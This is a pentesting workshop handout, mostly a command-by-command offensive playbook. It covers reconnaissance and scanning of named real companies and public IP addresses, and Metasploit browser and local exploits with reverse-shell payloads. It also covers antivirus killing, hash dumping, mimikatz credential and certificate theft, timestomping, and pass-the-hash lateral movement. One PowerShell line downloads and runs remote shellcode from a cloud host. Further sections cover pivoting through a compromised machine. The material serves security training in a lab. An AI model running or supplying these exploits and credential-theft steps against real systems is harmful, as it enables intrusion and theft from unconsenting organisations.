########################################
# FREE Advanced Pentesting Workshop    #
# By Joe McCray of Strategic Security  #
#########################################

I thought it would be fun to give one of my advanced pentesting classes out for FREE. 

I sincerely hope that you enjoy it and will subscribe to my YouTube channel: 
https://www.youtube.com/user/j0emccray


I'd love it if you'd follow/like/connect with me on my other social media platforms.
Twitter: https://twitter.com/j0emccray
Facebook: https://www.facebook.com/StrategicSec
LinkedIn: https://www.linkedin.com/in/joemccray


#############################
# Download the workshop VMs #
#############################
https://s3.amazonaws.com/StrategicSec-VMs/StrategicsecUbuntu14.zip
user: strategicsec
pass: strategicsec


https://s3.amazonaws.com/StrategicSec-VMs/Windows7.zip
user: workshop
pass: password


----------------------------------------------------------------------------------------------------------------------------


Let's start by pretending that we are assessing a pentest customer from the outside. 

I like to start with identifying external security mechanisms.



#######################################################
# Section 1: Identifying External Security Mechanisms #
#######################################################
 
Performing an external penetration test today is significantly harder than it was years ago.
 
There are so many external security mechanisms such as load balancers, reverse proxies, intrusion prevention systems, and web application firewalls.
 
Ok, let's do this!
 
Start by logging into your Ubuntu virtual machine with username 'strategicsec' and password 'strategicsec'.

 
###########################
# Target IP Determination #
###########################
cd /home/strategicsec/toolz
perl blindcrawl.pl -d motorola.com
 
-- Take each IP address and look ip up here:
http://www.networksolutions.com/whois/index.jsp
 
cd ~/toolz/fierce2
fierce -dns motorola.com
cd ..
 
-- Zone Transfer fails on most domains, but here is an example of one that works:
dig axfr heartinternet.co.uk  @ns.heartinternet.co.uk
 
 
cd ~/toolz/
./ipcrawl 148.87.1.1 148.87.1.254                               (DNS forward lookup against an IP range)
 
 
sudo nmap -sL 148.87.1.0-255
sudo nmap -sL 148.87.1.0-255 | grep oracle
 
 
 
###########################
# Load Balancer Detection #
###########################
 
-- Here are some options to use for identifying load balancers:
        - http://toolbar.netcraft.com/site_report/
        - Firefox LiveHTTP Headers (https://addons.mozilla.org/en-Us/firefox/addon/live-http-headers/)
 
-- Here is an example:
http://toolbar.netcraft.com/site_report/?url=citigroup.com
 
We found out that they are using a Citrix Netscaler Load Balancer.
192.193.103.222         Citrix Netscaler
192.193.219.58  
 
 
-- Here are some command-line options to use for identifying load balancers:
 
dig google.com
 
cd ~/toolz
./lbd-0.1.sh motorola.com
 
 
halberd microsoft.com
halberd motorola.com
halberd oracle.com

###################################################
# Section 2: Actually Using Metasploit (For real) #
###################################################

sudo /sbin/iptables -F
     strategicsec
 
cd ~/toolz/metasploit
 
./msfconsole

##############################################
# Run any Linux command inside of MSFConsole #
##############################################
ls
 
pwd
 
ping -c1 yahoo.com
 
nmap 192.168.10.129
 
nmap yahoo.com
 
 
 
-------------------------------
- You're on the outside scanning publicly accessable targets.
 
 
 
use auxiliary/scanner/portscan/tcp
 
set RHOSTS 54.69.156.253
 
set PORTS 80,1433,1521,3306,8000,8080,8081,10000                       
 
run
 
-------------------------------
use auxiliary/scanner/http/     (press the tab key, then press y to look through the http options)
 
 
- Here is an example:
use auxiliary/scanner/http/trace_axd
 
        - So let's do a quick google search for someone with trace.axd file
        - filetye:axd inurl:trace.axd
 
set RHOSTS 207.20.57.112
 
set VHOST motion-vr.net
 
run
 
-------------------------------
 
 
use auxiliary/scanner/http/http_version                
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
-------------------------------
 
use auxiliary/scanner/http/tomcat_enum                   
 
set RHOSTS 54.69.156.253
 
set RPORT 8081
 
run
 
 
 
-------------------------------
- In my opinion a much better option is a script called 'discover' from Lee Baird.
 
- You can get it here: 
https://github.com/leebaird/discover
 
- On the Ubuntu attack host you can run discover by typing the following:
cd ~/toolz/discover
sudo ./discover
 
 
- From here you can just follow the prompts. It will run both Nmap NSE scripts and Metasploit aux modules with all of the correct parameters for you.
 
 
##################################
# Basic Client-Side Exploitation #
##################################
 
echo j0e-r0x > /home/strategicsec/j0e-r0x.txt                   (You can of course replace j0e-r0x with yourname)
 
sudo /sbin/iptables -F
     strategicsec
 
cd ~/toolz/metasploit
 
./msfconsole
 
use exploit/windows/browser/ie_cgenericelement_uaf
 
set ExitOnSession false
 
set URIPATH /ie8
 
set PAYLOAD windows/meterpreter/reverse_tcp
 
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
 
exploit -j
 
 
- Now from the Win7 host, use Internet Explorer 8 to connect to the exploit address (local address)
- given to you by metasploit.
 
- The address will be something like:
 
http://192.168.10.128:8080/ie8                                            (Make sure you change this to your ubuntu ip address)
 
 
 
- This will simulate a victim clicking on your malicious link and being exploited with a browser exploit.
 
 
###########################
# Client-Side Enumeration #
###########################
 
 
- You can list the active sessions by typing:
 
sessions -l
 
 
 
 
- You can "interact" with any active session by typing sessions -i 3 (replace 3 with the session number you want to interact with)
 
 
sessions -i 1
 
 
 
 
 
- You should now see Metasploit's meterpreter prompt.
 
 
********************************** Figure out who and where you are **********************************
 
meterpreter> sysinfo
 
 
meterpreter> getuid
 
 
meterpreter> ipconfig
 
 
meterpreter> run post/windows/gather/checkvm
 
 
meterpreter> run get_local_subnets
 
 
 
********************************** Escalate privileges and get hashes **********************************
 
 
meterpreter> use priv
 
 
--Option 1: GetSystem
meterpreter> getsystem
 
--Option 2:
meterpreter > run post/windows/escalate/getsystem
 
--Option 3:
meterpreter> background
back
use post/windows/escalate/droplnk
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 1234
exploit
 
--Option 4:
use exploit/windows/local/bypassuac
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 12345
exploit
 
--Option 5:
use exploit/windows/local/service_permissions
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 5555
exploit
 
--Option 6:
use exploit/windows/local/trusted_service_path
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 4567
exploit
 
 
--Option 7:
use exploit/windows/local/ppr_flatten_rec
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7777
exploit
 
--Option 8:
use exploit/windows/local/ms_ndproxy
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7788
exploit
 
 
--Option 9:
use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop
meterpreter > getsystem
...got system (via technique 1).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)

meterpreter> run killav
 
meterpreter> run post/windows/gather/hashdump
 
meterpreter> run post/windows/gather/credentials/credential_collector
 
 
********************************** Steal Tokens **********************************
 
meterpreter > getsystem
 
meterpreter > use incognito
 
meterpreter > list_tokens -u
 
meterpreter > list_tokens -g
 
meterpreter > impersonate_token                         <-- choose who you want to impersonate but be sure to use 2 slashes in the name (ex: impersonate_token domain\\user)
 
meterpreter> getuid
 
 
************ Stealing credentials and certificates ************
- NOTE: Most of the stuff after 'kerberos' DOES NOT work, but is given here so you know the correct syntax to use when connected to AD or dealing with smart/CAC cards.
 
meterpreter > getsystem
 
meterpreter > load mimikatz
 
meterpreter > kerberos
 
meterpreter > mimikatz_command -f sekurlsa::logonPasswords -a "full"
 
meterpreter > msv                                                               <-- Your AD password
 
meterpreter > livessp                                                           <-- Your Windows8 password
 
meterpreter > ssp                                                               <-- Your outlook password
 
meterpreter > tspkg                                                             <-- Your AD password
 
meterpreter > wdigest                                                           <-- Your AD password
 
meterpreter > mimikatz_command -f crypto::listStores
 
meterpreter > mimikatz_command -f crypto::listCertificates
 
meterpreter > mimikatz_command -f crypto::exportCertificates CERT_SYSTEM_STORE_CURRENT_USER
 
meterpreter > mimikatz_command -f crypto::patchcapi
 
meterpreter> search -d <directory> -f <file-pattern>
 
 
********************************** Enumerate the host you are on **********************************
 
meterpreter > run getcountermeasure
 
meterpreter> run winenum
 
meterpreter > run post/windows/gather/enum_applications
 
meterpreter > run post/windows/gather/enum_logged_on_users
 
meterpreter > run post/windows/gather/usb_history
 
meterpreter > run post/windows/gather/enum_shares
 
meterpreter > run post/windows/gather/enum_snmp
 
meterpreter> reg enumkey -k HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
 
 
********************************** Prove access **********************************
 
meterpreter> upload /home/strategicsec/j0e-r0x.txt c:\\
 
meterpreter > timestomp C:\\j0e-r0x.txt -v
 
meterpreter > timestomp C:\\j0e-r0x.txt -m "12/12/2016 12:12:12"
 
meterpreter > timestomp C:\\j0e-r0x.txt -v


********************************** Lateral Movement *******************************
 
 
Now we can run the PSEXEC exploit.
-- Option 1:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass password
 
set RHOST 192.168.10.129
 
set payload windows/meterpreter/reverse_tcp
 
set LHOST 192.168.10.128
 
set LPORT 2345
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.10.129                      
 
set LHOST 192.168.10.128
 
set LPORT 5678
 
exploit



#########################
# PSExec not working??? #
#########################
Quick note:
If PSExec is not working then you may have to do the following to get it to work

use exploit/windows/local/ask
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.10.128                                            (Make sure you change this to your ubuntu ip address)
set LPORT 7799
exploit
 
 
meterpreter > getuid
Server username: win7-64-victim\Workshop

meterpreter > getsystem
...got system (via technique 1).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
 
--------------------------------------------------------
 
meterpreter > ps                (search for a process running as NT AUTHORITY\SYSTEM)
 
meterpreter > migrate 2800      (your process id WILL NOT be 2800, but make sure you use one that is running at NT AUTHORITY\SYSTEM)

- We use the shell command to get to the command prompt so we can add a registry key.
 
meterpreter > execute -c -H -f cmd -a "/k" -i
reg /?
 
 
- Created a registry field to the Victim computer, this will allow us to access the machine using and exploit via PSEXEC.
 
C:\Windows\system32> reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system  /v LocalAccountTokenFilterPolicy  /t REG_DWORD  /d  1



- Now your PSExec should be working.

#################################################
# Section 3: Writing Meterpreter Resource Files #
#################################################

- In this lab we are going to create a binary payload via msfpayload then craft a .rc file that automates the 
process to setup the multi handler listener.
 
- We will start off by creating the msfvenom

sudo /sbin/iptables -F
	strategicsec

cd ~/toolz/metasploit
 
./msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.10.128 -f exe > /home/strategicsec/Desktop/meterpreter.exe
 
sudo chmod 777 /home/strategicsec/Desktop/meterpreter.exe
 
- In the syntax above, we set the payload, set the local host address to connect back too, then redirected the 
malicious payload to our desktop by issuing the correct path. We will also change the permissions on it to 777 just 
to make it easy for us to use WinSCP to copy it over to our Win7 machine.
 
- Next we are going to create a .rc (resource file) file that will automate the process for setting up a listener.
 
- Navigate to the /home/strategicsec/toolz/metasploit/ so that when you create the .rc file you can save it in the 
working directory.
 
 
- Type 'touch meterpreter.rc' to create the file.
touch meterpreter.rc
 
- Type 'echo use exploit/multi/handler  >> meterpreter.rc' to be appended to the .rc file.
echo use exploit/multi/handler  >> meterpreter.rc
 
- Type 'echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc' to be appended to the .rc file.
echo set PAYLOAD windows/meterpreter/reverse_tcp  >> meterpreter.rc
 
- Type 'echo set LHOST 192.168.10.128>> meterpreter.rc' to be appended to the .rc file.
echo set LHOST 192.168.10.128>> meterpreter.rc
 
- Type 'echo exploit -j -z >> meterpreter.rc' to be appended to the .rc file.
echo exploit -j -z >> meterpreter.rc
 
- Then cat the meterpreter.rc out to verify that everything in the file looks ok.
cat meterpreter.rc
 
Now at the command prompt, type 'sudo ./msfconsole -r meterpreter.rc' to start the msfconsole module and call/run 

the 'meterpreter.rc' file.
./msfconsole -r meterpreter.rc
 
- Once the msfconsole starts, the meterpreter resource file is executed and the listener is automatically setup.  It is now listening for a connection!
 
- Now you must transfer the malicious meterpreter payload to the victim machine (you may do so by any means necessary, we have physical access so we transferred it via usb.
 
- Click on the payload and create the meterpreter session.
 
- Type 'sessions -l' to list your open sessions, and 'sessions -i 1' to indicate that you want to interact with 

meterpreter session under id 1.
 
exit -y
    	



***********************************
* Getting Serious About .rc files *
***********************************


touch /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run getcountermeasure >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run winenum >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_applications >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/enum_logged_on_users >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
echo run post/windows/gather/checkvm >> /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
- Ok, that was fun. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
 
 
touch /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
echo use exploit/windows/browser/ie_cgenericelement_uaf >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set ExitOnSession true >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set URIPATH /ie8 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set PAYLOAD windows/meterpreter/reverse_tcp >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo set LHOST 192.168.10.128 >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc                            

            
 
echo set AutoRunScript multi_console_command -rc /home/strategicsec/toolz/metasploit/autorun-walk-through.rc >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
echo exploit -j -z >> /home/strategicsec/toolz/metasploit/old-faithful-ie8.rc
 
 
 
- Ok, that was more fun than the previous one. Now let's take a quick look at the .rc file we just created.
cat /home/strategicsec/toolz/metasploit/autorun-walk-through.rc
 
 
- Alright, enough already. Let's run this thing.
./msfconsole -r old-faithful-ie8.rc



####################################
# Section 4: Playing with Nmap NSE #
####################################
 
nmap -Pn -p80 --script ip-geolocation-* strategicsec.com
 
nmap -p80 --script dns-brute strategicsec.com
 
nmap --script http-robtex-reverse-ip secore.info
 
nmap -Pn -p80 --script=http-headers strategicsec.com
 
 
ls /usr/share/nmap/scripts | grep http
nmap -Pn -p80 --script=http-* strategicsec.com
 
############
# Nmap NSE #
############
 
- Reference for this tutorial is:
https://thesprawl.org/research/writing-nse-scripts-for-vulnerability-scanning/
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
-- The Rule Section --
portrule = function(host, port)
    return port.protocol == "tcp"
            and port.number == 80
            and port.state == "open"
end
 
-- The Action Section --
action = function(host, port)
    return "Advanced Pentester Night School!"
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse strategicsec.com -p 22,80,443
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
 
-- The Rule Section --
portrule = shortport.http
 
 
-- The Action Section --
action = function(host, port)
    return "Advanced Pentester Night School!"
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse strategicsec.com -p 22,80,443
 
 
 
 
 
 
 
OK, now let's have some fun with my buddy Carlos Perez's website which you should have been looking at quite a lot if you were trying to get Ruby 2.1.5 working last year.
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
    return response.status
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        return response.body
    end
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
 
 
 
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
local string = require "string"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
        return title
    end
 
end
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
 
 
 
 
 
 
 
----------------------------------------------------------------------
sudo vi /usr/share/nmap/scripts/intro-nse.nse
 
-- The Head Section --
local shortport = require "shortport"
local http = require "http"
local string = require "string"
 
-- The Rule Section --
portrule = shortport.http
 
-- The Action Section --
action = function(host, port)
 
    local uri = "/installing-metasploit-in-ubunt/"
    local response = http.get(host, port, uri)
 
    if ( response.status == 200 ) then
        local title = string.match(response.body, "Installing Metasploit in Ubuntu and Debian")
 
        if (title) then
            return "Vulnerable"
        else
            return "Not Vulnerable"
        end
    end
end
 
----------------------------------------------------------------------
 
- Ok, now that we've made that change let's run the script
sudo nmap --script=/usr/share/nmap/scripts/intro-nse.nse darkoperator.com -p 22,80,443
 


###########################################
# Section 5: Custom Meterpreter Scripting #
###########################################


- In this lab we will be looking at how you can use some custom Meterpreter scripts to do more than what Metasploit 

can offer.  This will also show you the flexibility of the Meterpreter scripts.
 
- We're going to start off with a simple Hello World script first.  
 
   
echo 'print_status("Hello World")' > /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
- This next portion is up to you, exploit your test box and end up with a Meterpreter shell.
 
- Lets test out our helloworld.rb Meterpreter script.
 
 
meterpreter> run helloworld
 
 
- So far so good, now we can build on this base.  Lets add a couple more API calls to the script.
 
- Open /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb in your favorite and add following line.

vi /home/strategicsec/toolz/metasploit/scripts/meterpreter/helloworld.rb
 
 
print_error("this is an error!")
print_line("this is a line")
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- Now that we have the basics down, we're going to do something a little more exciting.  
- The architecture to follow when creating these scripts goes as follows:
 
def getinfo(session)
        begin
        	<stuff goes here>
        rescue ::Exception => e
        	<stuff goes here>
        end
end


- Copy and paste the following code into our helloworld.rb script:
 
def getinfo(session)
    begin
       sysnfo = session.sys.config.sysinfo
       runpriv = session.sys.config.getuid
       print_status("Getting system information ...")
       print_status("The target machine OS is #{sysnfo['OS']}")
       print_status("The computer name is #{'Computer'} ")
       print_status("Script running as #{runpriv}")
    rescue ::Exception => e
      print_error("The following error was encountered #{e}")
   end
end
 
getinfo(client)
 
 
 
- Now run the script:
 
meterpreter> run helloworld
 
 
- We can expand it by adding actual system commands to the script, lets look at how we can do this.
 
 
def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
commands = [ "set",
    "ipconfig  /all",
    "arp -a"]
 
list_exec(client,commands)
 
 
 
- Run the script:
 
meterpreter> run helloworld
  



###########################################
# Section 6: Tunneling For Fun and Profit #
###########################################

*****************************Enumerate the network you are on ***************************
 
meterpreter > run netenum
 
meterpreter > run netenum -ps -r 192.168.10.0/24
 
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.10.0/24
 
 
 
********************************** Set up your Pivot **********************************
 
meterpreter > background
                                                        <-- background the session
        You want to get back to this prompt:
        msf exploit(handler) > back                     <--- you need to get to main msf> prompt
 
 
 
        sessions -l                                     <--find a session you want to pivot through (note the IP and session number)
       
        Now set up Pivot with a route add
        ---------------------------------
 
route print
 
route add 192.168.10.129 255.255.255.0 1                       <-- Use correct session id (2), it may be 3, or 4 (make sure you are on msf> prommpt, not meterpreter)
 
 
route print                                             <----- verify new route
 
******************************Scan through your Pivot ******************************
 
use auxiliary/scanner/portscan/tcp                      <-- Run aux modules through your pivot
 
set THREADS 10
 
set RHOSTS 192.168.10.0/24				<-- Keep changing this IP and re-running the scan until you find something you want to attack
 
set PORTS 445
 
run
 
 
************************* Lateral movement through your Pivot *************************
 
-- Option 1:
use exploit/windows/smb/psexec
 
set RHOST 192.168.10.129
 
set LPORT 2345
 
set SMBUser Workshop
 
set SMBPass password
 
exploit
 
 
 
 
-- Option 2:
use exploit/windows/smb/psexec
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set payload windows/meterpreter/reverse_tcp
 
set RHOST 192.168.10.129                      
 
set LHOST 192.168.10.128
 
set LPORT 5678
 
exploit
 
 
 
-- Option 3:
background
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.10.129                      
 
run
 
 
 
-- Option 4:
use auxiliary/admin/smb/upload_file
 
set SMBUser Workshop
 
set SMBPass password
 
set LPATH /home/strategicsec/binaries/wce.exe
 
set RPATH "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\wce.exe"
 
set RHOST 192.168.10.129                      
 
run
 
 
-- Option 5:
use exploit/multi/handler
set ExitOnSession false
set payload windows/meterpreter/reverse_https
set LHOST 192.168.10.128
set LPORT 4443
set EXITFUNC thread
exploit -j
 
 
 
sessions -i 1
shell
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://s3.amazonaws.com/StrategicSec-Files/Powersploit/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.128 -Lport 4443 -Force"
 
 
###################
# Socks Tunneling #
###################
 
sudo vi /etc/proxychains.conf                           <--- Make sure that last line of the file is: socks4  127.0.0.1 1080
 
        --- Open a duplicate putty session to your Ubuntu host
        sudo vi /etc/proxychains.conf
       
        Comment out the proxy_dns, change the 9050 (tor port) to the metasploit socks proxy port (1080) and save it.
        socks4  127.0.0.1 1080
 
***************************Set up a Socks Proxy through your Pivot *************************
 
 
use auxiliary/server/socks4a
 
set SRVHOST 127.0.0.1
 
set SRVPORT 1080
 
run
 
        --- Go back to your other putty session with the meterpreter shell
cd ~
 
proxychains nmap -sT -PN -vv -sV --script=smb-os-discovery.nse -p 445 192.168.10.0/24          <--- This is going to be really slow
 
proxychains nmap -sT -PN -n -sV -p 21,22,23,25,80,110,139,443,1433,1521,3306,3389,8080,10000 192.168.10.0/24           <--- This is going to be really slow
 
 
        ---close the duplicate putty session to your Ubuntu host